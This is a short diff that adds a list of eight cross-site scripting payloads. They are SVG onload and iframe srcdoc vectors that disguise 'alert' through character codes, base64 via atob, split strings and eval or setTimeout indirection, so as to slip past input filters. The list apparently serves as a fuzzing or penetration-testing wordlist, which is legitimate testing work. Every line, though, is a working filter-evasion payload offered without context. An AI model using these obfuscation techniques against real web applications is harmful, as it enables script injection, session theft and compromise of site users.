@@ -1,0 +1,8 @@
+<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',0)>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQ='))(1)>"></iframe>
+<svg onload=window['ev'+'al'](String.fromCharCode(97,108,101,114,116)+'(1)')>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=window['al'+'ert'](String.fromCharCode(49))>
+<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116))(1)',0)>
+<svg onload=eval('window["a"+"lert"]')(1)>
+<svg onload=window['al'+'ert'](0x1)>
